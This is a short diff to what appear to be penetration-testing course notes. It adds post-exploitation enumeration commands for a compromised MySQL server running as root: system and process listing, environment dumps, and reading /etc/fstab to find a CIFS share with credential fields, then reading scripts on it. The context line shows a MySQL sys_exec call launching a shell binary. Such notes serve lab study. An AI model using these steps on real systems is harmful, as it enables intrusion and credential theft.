@@ -3486,7 +3486,17 @@ select sys_exec('./shell.elf');
 *** Post-Exploitation Enumeration (the mysql server, root)
     + src:
     #+begin_src sh
-
+cat /etc/issue
+cat /proc/version
+env
+  ## list environment variables
+ps aux
+netstat -tulpn       ## full reveal requires root
+cat /etc/fstab
+  ## //10.5.5.20/Scripts /mnt/scripts cifs uid=0,gid=0,username=,password=,_netdev 0 0
+ls /mnt/scripts
+  ## found some files
+cat system_report.ps1
     #+end_src
     // continue p796
 
